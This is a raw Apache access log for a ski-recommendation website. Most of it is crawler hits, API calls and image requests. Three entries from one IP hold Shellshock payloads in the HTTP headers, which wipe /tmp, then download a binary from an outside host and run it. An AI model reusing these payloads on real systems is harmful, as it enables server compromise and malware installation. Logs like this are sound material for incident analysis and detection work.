170.75.162.130 - - [22/Jun/2015:09:45:12 -0700] "GET /lib/reccapi.php?resort=chinapeak HTTP/1.1" 200 984 "-" "node-superagent/0.18.2"
123.125.71.71 - - [22/Jun/2015:09:55:11 -0700] "-" 408 0 "-" "-"
220.181.108.177 - - [22/Jun/2015:10:00:25 -0700] "-" 408 0 "-" "-"
170.75.162.130 - - [22/Jun/2015:10:03:24 -0700] "GET /lib/reccapi.php?resort=mountainhigh HTTP/1.1" 200 1018 "-" "node-superagent/0.18.2"
66.249.79.40 - - [22/Jun/2015:10:17:36 -0700] "GET / HTTP/1.1" 200 2376 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.128 - - [22/Jun/2015:10:20:29 -0700] "GET /about HTTP/1.1" 404 506 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
12.146.19.131 - - [22/Jun/2015:10:22:07 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0"
61.135.190.103 - - [22/Jun/2015:10:22:41 -0700] "GET / HTTP/1.1" 200 2376 "http://www.baidu.com/s?wd=WhereShouldISki-WeatherData-DrivenRecommendationsforSkiing" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
61.135.190.224 - - [22/Jun/2015:10:22:42 -0700] "GET /scripts/scripts/vendor/modernizr.js HTTP/1.1" 200 4903 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
61.135.190.103 - - [22/Jun/2015:10:22:42 -0700] "GET /bower_components/requirejs/require.js HTTP/1.1" 200 6701 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
61.135.190.103 - - [22/Jun/2015:10:22:42 -0700] "GET /scripts/fa48e319.main.js HTTP/1.1" 200 123455 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
61.135.190.103 - - [22/Jun/2015:10:22:43 -0700] "GET /lib/reccapi.php?fields=t HTTP/1.1" 200 1672 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
207.242.136.178 - - [22/Jun/2015:10:30:55 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
70.214.42.181 - - [22/Jun/2015:10:36:37 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.56 Mobile/12F70 Safari/600.1.4"
180.76.15.13 - - [22/Jun/2015:10:37:29 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.34 - - [22/Jun/2015:10:37:49 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
170.75.162.130 - - [22/Jun/2015:10:39:58 -0700] "GET /lib/reccapi.php?resort=sugarbush HTTP/1.1" 200 962 "-" "node-superagent/0.18.2"
66.214.109.141 - - [22/Jun/2015:10:46:05 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
69.170.11.50 - - [22/Jun/2015:10:52:20 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
185.35.62.11 - - [22/Jun/2015:10:54:09 -0700] "HEAD / HTTP/1.1" 200 291 "-" "-"
66.249.79.1 - - [22/Jun/2015:10:57:15 -0700] "GET /resorts?resort=bigsky&date=2014-02-07 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
67.240.107.46 - - [22/Jun/2015:10:59:10 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
123.125.71.85 - - [22/Jun/2015:11:00:16 -0700] "-" 408 0 "-" "-"
170.75.162.130 - - [22/Jun/2015:11:01:40 -0700] "GET /lib/reccapi.php?resort=winterpark HTTP/1.1" 200 977 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:11:01:50 -0700] "GET /lib/reccapi.php?resort=snowbasin HTTP/1.1" 200 970 "-" "node-superagent/0.18.2"
84.169.85.211 - - [22/Jun/2015:11:02:16 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36"
220.181.108.144 - - [22/Jun/2015:11:05:49 -0700] "-" 408 0 "-" "-"
170.75.162.130 - - [22/Jun/2015:11:09:10 -0700] "GET /lib/reccapi.php?resort=northstar-at-tahoe HTTP/1.1" 200 970 "-" "node-superagent/0.18.2"
107.77.92.93 - - [22/Jun/2015:11:11:17 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; PJ83100/1.85.502.3 Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
66.249.79.66 - - [22/Jun/2015:11:14:09 -0700] "GET / HTTP/1.1" 200 2376 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
108.206.117.212 - - [22/Jun/2015:11:19:10 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36"
166.137.126.95 - - [22/Jun/2015:11:20:16 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG-SM-G900A Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36"
170.75.162.130 - - [22/Jun/2015:11:21:22 -0700] "GET /lib/reccapi.php?resort=brianhead HTTP/1.1" 200 968 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:11:24:42 -0700] "GET /lib/reccapi.php?resort=kirkwood HTTP/1.1" 200 991 "-" "node-superagent/0.18.2"
180.76.15.153 - - [22/Jun/2015:11:25:19 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.19 - - [22/Jun/2015:11:25:39 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
170.75.162.130 - - [22/Jun/2015:11:27:42 -0700] "GET /lib/reccapi.php?resort=coppermountain HTTP/1.1" 200 978 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:11:40:33 -0700] "GET /lib/reccapi.php?resort=canyons HTTP/1.1" 200 944 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:11:40:33 -0700] "GET /lib/reccapi.php?resort=brighton HTTP/1.1" 200 975 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:11:40:33 -0700] "GET /lib/reccapi.php?resort=alta HTTP/1.1" 200 971 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:11:40:33 -0700] "GET /lib/reccapi.php?resort=parkcity HTTP/1.1" 200 992 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:11:40:33 -0700] "GET /lib/reccapi.php?resort=solitude HTTP/1.1" 200 965 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:11:47:24 -0700] "GET /lib/reccapi.php?resort=aspenheights HTTP/1.1" 200 967 "-" "node-superagent/0.18.2"
195.200.70.43 - - [22/Jun/2015:11:48:23 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko"
70.214.38.39 - - [22/Jun/2015:11:54:45 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) CriOS/33.0.1750.14 Mobile/11D167 Safari/9537.53"
170.75.162.130 - - [22/Jun/2015:11:55:05 -0700] "GET /lib/reccapi.php?resort=madriverglen HTTP/1.1" 200 958 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:11:55:05 -0700] "GET /lib/reccapi.php?resort=stowe HTTP/1.1" 200 941 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:11:55:05 -0700] "GET /lib/reccapi.php?resort=jaypeak HTTP/1.1" 200 968 "-" "node-superagent/0.18.2"
187.60.175.3 - - [22/Jun/2015:11:57:08 -0700] "GET / HTTP/1.1" 200 2376 "http://100dollars-seo.com/try.php?u=http://whereshouldiski.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
187.60.175.3 - - [22/Jun/2015:11:57:08 -0700] "GET /styles/0fffd548.main.css HTTP/1.1" 200 19316 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
187.60.175.3 - - [22/Jun/2015:11:57:08 -0700] "GET /bower_components/requirejs/require.js HTTP/1.1" 200 6702 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
187.60.175.3 - - [22/Jun/2015:11:57:08 -0700] "GET /scripts/scripts/vendor/modernizr.js HTTP/1.1" 200 4903 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
187.60.175.3 - - [22/Jun/2015:11:57:09 -0700] "GET /images/loading.gif HTTP/1.1" 200 13881 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
187.60.175.3 - - [22/Jun/2015:11:57:09 -0700] "GET /images/logo-sm.png HTTP/1.1" 200 16737 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
187.60.175.3 - - [22/Jun/2015:11:57:09 -0700] "GET /scripts/fa48e319.main.js HTTP/1.1" 200 123455 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
187.60.175.3 - - [22/Jun/2015:11:57:11 -0700] "GET /images/button.png HTTP/1.1" 200 598 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
187.60.175.3 - - [22/Jun/2015:11:57:11 -0700] "GET /lib/reccapi.php?fields=t HTTP/1.1" 200 1672 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
187.60.175.3 - - [22/Jun/2015:11:57:11 -0700] "GET /images/greyHeader.png HTTP/1.1" 200 508 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
187.60.175.3 - - [22/Jun/2015:11:57:11 -0700] "GET /images/star5.png HTTP/1.1" 200 1783 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
187.60.175.3 - - [22/Jun/2015:11:57:11 -0700] "GET /images/snowflake5.png HTTP/1.1" 200 2857 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
187.60.175.3 - - [22/Jun/2015:11:57:12 -0700] "GET /images/bluebird5.png HTTP/1.1" 200 2178 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
187.60.175.3 - - [22/Jun/2015:11:57:12 -0700] "GET /images/mtns-icon.png HTTP/1.1" 200 1097 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
187.60.175.3 - - [22/Jun/2015:11:57:12 -0700] "GET /images/shading-icon.png HTTP/1.1" 200 537 "http://whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
127.0.0.1 - - [22/Jun/2015:11:57:19 -0700] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.2.22 (Ubuntu) (internal dummy connection)"
123.125.71.20 - - [22/Jun/2015:12:02:01 -0700] "-" 408 0 "-" "-"
170.75.162.130 - - [22/Jun/2015:12:04:06 -0700] "GET /lib/reccapi.php?resort=mounthoodmeadows HTTP/1.1" 200 976 "-" "node-superagent/0.18.2"
220.181.108.82 - - [22/Jun/2015:12:07:49 -0700] "-" 408 0 "-" "-"
66.249.79.66 - - [22/Jun/2015:12:23:55 -0700] "GET / HTTP/1.1" 200 2376 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.53 - - [22/Jun/2015:12:24:04 -0700] "GET /styles/0fffd548.main.css HTTP/1.1" 200 19317 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
70.214.39.168 - - [22/Jun/2015:12:26:46 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4"
180.76.15.28 - - [22/Jun/2015:12:28:42 -0700] "GET /resorts?resort=jacksonhole&date=2014-05-06 HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.76.170.84 - - [22/Jun/2015:12:29:49 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12F70"
120.210.205.215 - - [22/Jun/2015:12:40:23 -0700] "GET / HTTP/1.1" 200 6151 "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://houmen.linux22.cn:123/houmen/linux223 -O /tmp/China.Z-hoqy\x90 >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-hoqy\x90 >> /tmp/Run.sh;echo /tmp/China.Z-hoqy\x90 >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\"" "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://houmen.linux22.cn:123/houmen/linux223 -O /tmp/China.Z-hoqy\x90 >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-hoqy\x90 >> /tmp/Run.sh;echo /tmp/China.Z-hoqy\x90 >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\""
66.249.79.14 - - [22/Jun/2015:12:41:15 -0700] "GET /resorts?resort=aspenmountain&date=2014-02-01 HTTP/1.1" 404 506 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
120.210.205.215 - - [22/Jun/2015:12:42:45 -0700] "GET / HTTP/1.1" 200 6151 "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://houmen.linux22.cn:123/houmen/linux223 -O /tmp/China.Z-djql\xf8 >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-djql\xf8 >> /tmp/Run.sh;echo /tmp/China.Z-djql\xf8 >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\"" "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://houmen.linux22.cn:123/houmen/linux223 -O /tmp/China.Z-djql\xf8 >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-djql\xf8 >> /tmp/Run.sh;echo /tmp/China.Z-djql\xf8 >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\""
123.125.71.17 - - [22/Jun/2015:12:50:04 -0700] "-" 408 0 "-" "-"
120.210.205.215 - - [22/Jun/2015:12:51:13 -0700] "GET / HTTP/1.1" 200 6151 "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://houmen.linux22.cn:123/houmen/linux223 -O /tmp/China.Z-wzbs\xe8 >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-wzbs\xe8 >> /tmp/Run.sh;echo /tmp/China.Z-wzbs\xe8 >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\"" "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://houmen.linux22.cn:123/houmen/linux223 -O /tmp/China.Z-wzbs\xe8 >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-wzbs\xe8 >> /tmp/Run.sh;echo /tmp/China.Z-wzbs\xe8 >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\""
180.76.15.33 - - [22/Jun/2015:12:51:16 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.26 - - [22/Jun/2015:12:52:19 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
220.181.108.114 - - [22/Jun/2015:12:54:48 -0700] "-" 408 0 "-" "-"
71.94.200.182 - - [22/Jun/2015:13:01:14 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15"
50.174.95.96 - - [22/Jun/2015:13:06:58 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0"
170.75.162.130 - - [22/Jun/2015:13:12:32 -0700] "GET /lib/reccapi.php?resort=killington HTTP/1.1" 200 957 "-" "node-superagent/0.18.2"
61.135.190.102 - - [22/Jun/2015:13:13:01 -0700] "GET / HTTP/1.1" 200 2376 "http://www.baidu.com/s?wd=WhereShouldISki-WeatherData-DrivenRecommendationsforSkiing" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
61.135.190.219 - - [22/Jun/2015:13:13:01 -0700] "GET /scripts/scripts/vendor/modernizr.js HTTP/1.1" 200 4903 "http://www.whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
61.135.190.102 - - [22/Jun/2015:13:13:01 -0700] "GET /bower_components/requirejs/require.js HTTP/1.1" 200 6701 "http://www.whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
61.135.190.102 - - [22/Jun/2015:13:13:02 -0700] "GET /scripts/fa48e319.main.js HTTP/1.1" 200 123455 "http://www.whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
61.135.190.219 - - [22/Jun/2015:13:13:04 -0700] "GET /lib/reccapi.php?fields=t HTTP/1.1" 200 1673 "http://www.whereshouldiski.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
107.77.92.92 - - [22/Jun/2015:13:13:39 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/6.0.51363 Mobile/12B466 Safari/600.1.4"
170.75.162.130 - - [22/Jun/2015:13:16:33 -0700] "GET /lib/reccapi.php?resort=alpinemeadows HTTP/1.1" 200 1009 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:13:16:33 -0700] "GET /lib/reccapi.php?resort=wildcatmountain HTTP/1.1" 200 1033 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:13:16:53 -0700] "GET /lib/reccapi.php?resort=smugglersnotch HTTP/1.1" 200 963 "-" "node-superagent/0.18.2"
66.249.79.53 - - [22/Jun/2015:13:19:58 -0700] "GET / HTTP/1.1" 200 2376 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [22/Jun/2015:13:22:43 -0700] "GET /lib/reccapi.php?resort=crestedbutte HTTP/1.1" 200 973 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:13:25:04 -0700] "GET /lib/reccapi.php?resort=bigwhite HTTP/1.1" 200 913 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:13:26:04 -0700] "GET /lib/reccapi.php?resort=sierra-at-tahoe HTTP/1.1" 200 970 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:13:26:04 -0700] "GET /lib/reccapi.php?resort=mountbachelor HTTP/1.1" 200 982 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:13:26:04 -0700] "GET /lib/reccapi.php?resort=silverstarmountain HTTP/1.1" 200 927 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:13:26:04 -0700] "GET /lib/reccapi.php?resort=stevenspass HTTP/1.1" 200 992 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:13:26:54 -0700] "GET /lib/reccapi.php?resort=mtrose HTTP/1.1" 200 954 "-" "node-superagent/0.18.2"
170.75.162.130 - - [22/Jun/2015:13:30:54 -0700] "GET /lib/reccapi.php?resort=snowbird HTTP/1.1" 200 977 "-" "node-superagent/0.18.2"
71.92.177.122 - - [22/Jun/2015:13:53:30 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
201.103.217.66 - - [22/Jun/2015:13:54:18 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
123.125.71.51 - - [22/Jun/2015:13:54:59 -0700] "-" 408 0 "-" "-"
220.181.108.183 - - [22/Jun/2015:14:00:16 -0700] "-" 408 0 "-" "-"
180.76.15.146 - - [22/Jun/2015:14:03:58 -0700] "GET /resorts?resort=skiapache&date=2014-09-30 HTTP/1.1" 404 472 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.18 - - [22/Jun/2015:14:09:05 -0700] "GET / HTTP/1.1" 200 2339 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
192.107.155.5 - - [22/Jun/2015:14:12:20 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6052 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
66.249.79.66 - - [22/Jun/2015:14:14:47 -0700] "GET / HTTP/1.1" 200 2376 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
24.152.171.55 - - [22/Jun/2015:14:18:32 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:38.0) Gecko/20100101 Firefox/38.0"
170.75.162.130 - - [22/Jun/2015:14:19:19 -0700] "GET /lib/reccapi.php?resort=homewoodmountain HTTP/1.1" 200 986 "-" "node-superagent/0.18.2"
180.76.15.10 - - [22/Jun/2015:14:31:27 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
184.186.219.60 - - [22/Jun/2015:14:31:37 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36"
180.76.15.147 - - [22/Jun/2015:14:32:05 -0700] "GET / HTTP/1.1" 200 6114 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
158.145.240.113 - - [22/Jun/2015:14:34:40 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
12.174.235.162 - - [22/Jun/2015:14:38:04 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
170.75.162.130 - - [22/Jun/2015:14:49:42 -0700] "GET /lib/reccapi.php?resort=squawvalleyusa HTTP/1.1" 200 985 "-" "node-superagent/0.18.2"
191.190.6.142 - - [22/Jun/2015:14:53:04 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
123.125.71.12 - - [22/Jun/2015:14:57:54 -0700] "-" 408 0 "-" "-"
208.180.213.130 - - [22/Jun/2015:15:01:09 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
